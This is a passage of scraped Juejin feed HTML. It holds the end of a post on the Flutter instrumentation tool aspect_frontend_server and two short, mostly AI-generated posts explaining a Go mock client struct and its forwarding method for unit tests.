<pre><code class="hljs language-dart" lang="dart"><span class="hljs-meta">@pragma</span>(<span class="hljs-string">'vm:entry-point'</span>)
<span class="hljs-meta">@pragma</span>(<span class="hljs-string">"aopd:inject"</span>, {
    <span class="hljs-comment">//注入的包名</span>
    <span class="hljs-string">"importUri"</span>: <span class="hljs-string">"package:flutter/src/gestures/binding.dart"</span>,
    <span class="hljs-comment">//注入的类名</span>
    <span class="hljs-string">"clsName"</span>: <span class="hljs-string">"GestureBinding"</span>,
    <span class="hljs-comment">//注入的方法名</span>
    <span class="hljs-string">"methodName"</span>: <span class="hljs-string">"-dispatchEvent"</span>,
    <span class="hljs-comment">//是否符号匹配</span>
    <span class="hljs-string">"isRegex"</span>: <span class="hljs-keyword">false</span>
})
<span class="hljs-comment">//必须是static,不然不起作用</span>
<span class="hljs-keyword">static</span> <span class="hljs-built_in">dynamic</span> dispatchEvent(
    <span class="hljs-built_in">Object</span> target,
    <span class="hljs-built_in">String</span> functionName,
    <span class="hljs-built_in">List</span>&lt;<span class="hljs-built_in">dynamic</span>&gt; positionalParams,
    <span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">dynamic</span>, <span class="hljs-built_in">dynamic</span>&gt; namedParams,
    <span class="hljs-built_in">Function</span> proceed) {
        PointerEvent event = positionalParams[<span class="hljs-number">0</span>];
        HitTestResult? hitTestResult = positionalParams[<span class="hljs-number">1</span>];
        debugPrint(<span class="hljs-string">'dispatchEvent - start <span class="hljs-subst">${event.kind.name}</span>'</span>);
        <span class="hljs-keyword">return</span> proceed.call(event, hitTestResult);
}
</code></pre>
<p>上面的例子可以拦截所有Flutter底层传递给应用层的触摸事件，如果我们需要分析用户的行为，通过在这个函数上插桩就可以很容易实现。</p>
<h5 data-id="heading-5"><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Flancexin%2Faspect_frontend_server" target="_blank" title="https://github.com/lancexin/aspect_frontend_server" ref="nofollow noopener noreferrer">aspect_frontend_server</a>的用法还有很多，例如静态方法插桩，mixin插桩，extension插桩等等。可以自己下载项目运行example了解。</h5>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Flancexin%2Faspect_frontend_server" target="_blank" title="https://github.com/lancexin/aspect_frontend_server" ref="nofollow noopener noreferrer">aspect_frontend_server</a>相对于aspectd有很大不同：</p>
<ol>
<li>aspectd不支持flutter 2.5.4以上,本项目最高支持到2.38.1</li>
<li>aspectd使用前需要对flutter tools的代码进行修改,本项目只需要替换flutter sdk对应的frontend_server.dart.snapshot即可</li>
<li>aspectd的实现原理过于复杂,本项目去掉了Call,Inject等用法保留了Execute用法的同时对注入逻辑进行了简化</li>
<li>aspectd还需要aspect_impl等,本项目可以直接在主程序代码中添加注入代码,也可以用plugin的方式添加</li>
<li>本项目不需要引入任何第三方包,用pragma注解完成对应插桩</li>
<li>支持hot restart,aspectd的注入代码修改后，需要重启程序才能看到改变，这样很不利于差桩代码的编写，<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Flancexin%2Faspect_frontend_server" target="_blank" title="https://github.com/lancexin/aspect_frontend_server" ref="nofollow noopener noreferrer">aspect_frontend_server</a>的差桩代码在改变后可以直接通过hot restart就能看到最新的改变。</li>
</ol>
<h4 data-id="heading-6">在维护<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Flancexin%2Faspect_frontend_server" target="_blank" title="https://github.com/lancexin/aspect_frontend_server" ref="nofollow noopener noreferrer">aspect_frontend_server</a>过程中也碰到了一些bug，感谢反馈bug的小伙伴。目前已知的问题已经修复：</h4>
<ol>
<li>extionsion和mixin方法注入</li>
<li>实现try-catch的注入</li>
<li>实现getter方法的注入</li>
<li>解决函数返回值为Futnre 范型报错的问题</li>
<li>解决编译添加–obfuscate混淆出错的问题</li>
<li>解决isRegex参数某些情况不起作用的bug等等</li>
</ol>
<p>希望有更多的小伙伴使用并反馈问题，我会一直将这个项目维护下去。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[go如何写单元测试1]]></title>    <link>https://juejin.cn/post/7574869203431538703</link>    <guid>https://juejin.cn/post/7574869203431538703</guid>    <pubDate>2025-11-21T03:02:30.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7574869203431538703" data-draft-id="7574671792998350883" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="go如何写单元测试1"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-11-21T03:02:30.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Rexi"/> <meta itemprop="url" content="https://juejin.cn/user/4343538649408960"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            go如何写单元测试1
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4343538649408960/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Rexi
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-21T03:02:30.000Z" title="Fri Nov 21 2025 03:02:30 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>注：本文基本内容由AI生成，但AI生成的内容由笔者确定质量后给予展示。</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">type</span> MockTsaInsTemplateClient <span class="hljs-keyword">struct</span> { 
    GetBindInsIdByTimeFunc <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(appId, taskTypeId, product <span class="hljs-type">string</span>)</span></span> ([]<span class="hljs-type">string</span>, <span class="hljs-type">error</span>) 
}
</code></pre>
<hr/>
<h2 data-id="heading-0">代码解析</h2>
<p>这两行Go语言代码定义了一个<strong>结构体类型</strong>，核心作用是创建一个“可模拟的客户端”（用于测试场景），下面逐部分拆解讲解：</p>
<h4 data-id="heading-1">1. 第一行：定义结构体类型</h4>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">type</span> MockTsaInsTemplateClient <span class="hljs-keyword">struct</span> {
}
</code></pre>
<ul>
<li><code>type</code>：Go语言中用于<strong>定义新类型</strong>的关键字（这里是定义“结构体类型”）。</li>
<li><code>MockTsaInsTemplateClient</code>：结构体名称，命名规则很清晰：</li>
</ul>

<ul>
<li>
<ul>
<li><code>Mock</code>：表示这是一个“模拟对象”（通常用于单元测试，替代真实的客户端依赖，避免测试依赖外部服务）；</li>
<li><code>TsaInsTemplate</code>：业务相关前缀（推测是“TSA保险模板”类的业务模块，仅为语义标识）；</li>
<li><code>Client</code>：表示这是一个“客户端”（通常用于调用某个服务/接口的对象）。</li>
</ul>
</li>
</ul>

<ul>
<li>结构体本质是“字段的集合”，这里的结构体内部只定义了一个字段（第二行代码）。</li>
</ul>
<h4 data-id="heading-2">2. 第二行：结构体的字段定义</h4>
<pre><code class="hljs language-go" lang="go">    GetBindInsIdByTimeFunc <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(appId, taskTypeId, product <span class="hljs-type">string</span>)</span></span> ([]<span class="hljs-type">string</span>, <span class="hljs-type">error</span>)
</code></pre>
<p>这是结构体的核心字段，类型是<strong>函数类型</strong>（Go语言支持将函数作为变量/字段），拆解如下：</p>
<ul>
<li>字段名：<code>GetBindInsIdByTimeFunc</code></li>
</ul>

<ul>
<li>
<ul>
<li>命名语义：<code>GetBindInsIdByTime</code> 表示“根据时间获取绑定的保险ID”（业务含义）；</li>
<li>后缀<code>Func</code>：明确标识这是一个“函数类型的字段”（约定俗成的命名方式，提高可读性）。</li>
</ul>
</li>
</ul>

<ul>
<li>字段的函数类型签名（即函数的“输入参数”和“返回值”定义）：</li>
</ul>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(appId, taskTypeId, product <span class="hljs-type">string</span>)</span></span> ([]<span class="hljs-type">string</span>, <span class="hljs-type">error</span>)
</code></pre>
<ul>
<li>
<ul>
<li>输入参数（3个，均为<code>string</code>类型）：</li>
</ul>
</li>
</ul>

<ul>
<li>
<ul>
<li>
<ul>
<li><code>appId</code>：应用ID（用于区分不同的应用）；</li>
<li><code>taskTypeId</code>：任务类型ID（区分不同的任务类型）；</li>
<li><code>product</code>：产品标识（区分不同的产品）；</li>
</ul>
</li>
</ul>
</li>
</ul>

<ul>
<li>
<ul>
<li>返回值（2个）：</li>
</ul>
</li>
</ul>

<ul>
<li>
<ul>
<li>
<ul>
<li><code>[]string</code>：字符串切片（返回多个“保险ID”，因为业务是“获取绑定的保险ID”，可能返回多个结果）；</li>
<li><code>error</code>：错误类型（Go语言约定：函数执行失败时返回非<code>nil</code>的错误，成功时返回<code>nil</code>）。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 data-id="heading-3">核心用途：模拟客户端用于测试</h4>
<p>这个结构体的设计目的是<strong>替代真实的</strong><code>TsaInsTemplateClient</code>，在单元测试中使用：</p>
<ul>
<li>真实的客户端可能需要调用远程服务（如HTTP接口、数据库），测试时依赖外部环境，不稳定且速度慢；</li>
<li>模拟客户端（<code>MockTsaInsTemplateClient</code>）通过“函数字段”让测试代码可以<strong>自定义返回结果</strong>（无需调用真实服务）。</li>
</ul>
<h5 data-id="heading-4">用法示例（测试场景）：</h5>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// 1. 创建模拟客户端实例</span>
mockClient := &amp;MockTsaInsTemplateClient{
    <span class="hljs-comment">// 自定义函数字段的实现：模拟“成功返回2个保险ID”</span>
    GetBindInsIdByTimeFunc: <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(appId, taskTypeId, product <span class="hljs-type">string</span>)</span></span> ([]<span class="hljs-type">string</span>, <span class="hljs-type">error</span>) {
        <span class="hljs-keyword">return</span> []<span class="hljs-type">string</span>{<span class="hljs-string">"ins_123"</span>, <span class="hljs-string">"ins_456"</span>}, <span class="hljs-literal">nil</span>
    },
}

<span class="hljs-comment">// 2. 测试时调用模拟客户端的函数字段（替代真实调用）</span>
ids, err := mockClient.GetBindInsIdByTimeFunc(<span class="hljs-string">"app_001"</span>, <span class="hljs-string">"task_01"</span>, <span class="hljs-string">"product_abc"</span>)
<span class="hljs-comment">// 此时会得到预设的返回值：ids = ["ins_123", "ins_456"], err = nil</span>
</code></pre>
<p>也可以模拟“失败场景”：</p>
<pre><code class="hljs language-go" lang="go">mockClient.GetBindInsIdByTimeFunc = <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(appId, taskTypeId, product <span class="hljs-type">string</span>)</span></span> ([]<span class="hljs-type">string</span>, <span class="hljs-type">error</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, errors.New(<span class="hljs-string">"获取保险ID失败"</span>)
}
</code></pre>
<h4 data-id="heading-5">总结</h4>
<p>这两行代码的核心是：</p>
<ol>
<li>定义一个<strong>模拟客户端结构体</strong>（用于测试，解耦真实依赖）；</li>
<li>结构体中包含一个<strong>函数类型字段</strong>（该函数对应“根据条件获取保险ID”的业务逻辑，测试时可自定义其行为）。</li>
</ol>
<p>这种设计是Go语言单元测试中“模拟依赖”的常用技巧，能让测试不依赖外部服务，更稳定、高效。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[go如何写单元测试2]]></title>    <link>https://juejin.cn/post/7574704948153008180</link>    <guid>https://juejin.cn/post/7574704948153008180</guid>    <pubDate>2025-11-21T03:11:32.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7574704948153008180" data-draft-id="7574869203431571471" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="go如何写单元测试2"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-11-21T03:11:32.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Rexi"/> <meta itemprop="url" content="https://juejin.cn/user/4343538649408960"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            go如何写单元测试2
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4343538649408960/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Rexi
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-21T03:11:32.000Z" title="Fri Nov 21 2025 03:11:32 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>注：本文基本内容由AI生成，但AI生成的内容由笔者确定质量后给予展示。</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(m *MockTsaInsTemplateClient)</span></span> GetBindInsIdByTime(appId, taskTypeId, product <span class="hljs-type">string</span>) ([]<span class="hljs-type">string</span>, <span class="hljs-type">error</span>) { 
    <span class="hljs-keyword">if</span> m.GetBindInsIdByTimeFunc != <span class="hljs-literal">nil</span> {
        <span class="hljs-keyword">return</span> m.GetBindInsIdByTimeFunc(appId, taskTypeId, product)
    } 
    <span class="hljs-keyword">return</span> []<span class="hljs-type">string</span>{}, <span class="hljs-literal">nil</span> 
}
</code></pre>
<hr/>
<h2 data-id="heading-0">代码解析</h2>
<p>这两行（实际是一段完整的Go语言<strong>结构体方法</strong>代码）是对之前 <code>MockTsaInsTemplateClient</code> 结构体的补充，核心作用是：为模拟客户端提供一个<strong>统一的业务方法入口</strong>，同时通过之前定义的函数字段 <code>GetBindInsIdByTimeFunc</code> 实现“可自定义行为”（适配测试场景）。</p>
<p>下面逐部分拆解讲解：</p>
<h4 data-id="heading-1">1. 先看整体结构：结构体方法的定义</h4>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// GetBindInsIdByTime mock方法</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(m *MockTsaInsTemplateClient)</span></span> GetBindInsIdByTime(appId, taskTypeId, product <span class="hljs-type">string</span>) ([]<span class="hljs-type">string</span>, <span class="hljs-type">error</span>) {
    <span class="hljs-comment">// 方法体逻辑</span>
}
</code></pre>
<p>这是Go语言中“给结构体绑定方法”的语法，拆解关键部分：</p>
<ul>
<li>注释 <code>// GetBindInsIdByTime mock方法</code>：明确说明这是 <code>GetBindInsIdByTime</code> 接口的“模拟实现方法”（对应真实客户端的同名方法）；</li>
<li><code>func</code>：定义函数/方法的关键字；</li>
<li><code>(m *MockTsaInsTemplateClient)</code>：<strong>方法接收器（Receiver）</strong> ，表示这个方法属于 <code>MockTsaInsTemplateClient</code> 结构体的指针类型实例：</li>
</ul>

<ul>
<li>
<ul>
<li><code>m</code>：接收器变量名（类似其他语言的 <code>this</code>/<code>self</code>，约定用结构体首字母小写）；</li>
<li><code>*MockTsaInsTemplateClient</code>：指针类型接收器（避免拷贝，且能访问/修改结构体的字段）；</li>
</ul>
</li>
</ul>

<ul>
<li>方法名 <code>GetBindInsIdByTime</code>：和真实客户端的业务方法名<strong>完全一致</strong>（这是关键！目的是让模拟客户端和真实客户端“接口兼容”，测试时可直接替换）；</li>
<li>入参 <code>(appId, taskTypeId, product string)</code>：和之前函数字段 <code>GetBindInsIdByTimeFunc</code> 的入参完全一致（对齐真实业务方法的参数）；</li>
<li>返回值 <code>([]string, error)</code>：也和函数字段、真实业务方法的返回值一致（保证接口兼容性）。</li>
</ul>
<h4 data-id="heading-2">2. 方法体逻辑：“转发调用”+“默认兜底”</h4>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">if</span> m.GetBindInsIdByTimeFunc != <span class="hljs-literal">nil</span> {
    <span class="hljs-keyword">return</span> m.GetBindInsIdByTimeFunc(appId, taskTypeId, product)
}
<span class="hljs-keyword">return</span> []<span class="hljs-type">string</span>{}, <span class="hljs-literal">nil</span>
</code></pre>
<p>逻辑非常简单，分两步：</p>
<h5 data-id="heading-3">第一步：优先调用自定义的函数字段（测试核心）</h5>
<ul>
<li><code>if m.GetBindInsIdByTimeFunc != nil</code>：判断结构体的函数字段 <code>GetBindInsIdByTimeFunc</code> 是否被赋值（即测试代码是否自定义了该函数的行为）；</li>
<li>如果不为 <code>nil</code>（已自定义），则直接调用这个函数字段，并把方法的入参 <code>(appId, taskTypeId, product)</code> 原样传递过去，返回自定义函数的结果。</li>
</ul>
<h5 data-id="heading-4">第二步：默认兜底（避免空指针恐慌）</h5>
<ul>
<li>如果 <code>m.GetBindInsIdByTimeFunc</code> 为 <code>nil</code>（测试代码没自定义），则返回默认值：空字符串切片 <code>[]string{}</code> 和 <code>nil</code> 错误；</li>
<li>目的是：避免因函数字段未赋值导致的 <code>nil</code> 函数调用（会触发程序崩溃），提供一个“安全的默认行为”。</li>
</ul>
<h4 data-id="heading-5">3. 核心设计意图：接口兼容 + 灵活模拟</h4>
<p>为什么要写这个方法？而不是让测试代码直接调用 <code>GetBindInsIdByTimeFunc</code>？</p>
<h5 data-id="heading-6">（1）和真实客户端“接口统一”，实现“无缝替换”</h5>
<p>假设真实的客户端结构体（比如 <code>TsaInsTemplateClient</code>）也有一个完全相同的方法：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// 真实客户端的业务方法（示例）</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *TsaInsTemplateClient)</span></span> GetBindInsIdByTime(appId, taskTypeId, product <span class="hljs-type">string</span>) ([]<span class="hljs-type">string</span>, <span class="hljs-type">error</span>) {
    <span class="hljs-comment">// 调用真实远程服务/数据库的逻辑</span>
}
</code></pre>
<p>此时，<code>MockTsaInsTemplateClient</code> 和真实客户端的“方法签名完全一致”——这意味着：</p>
<ul>
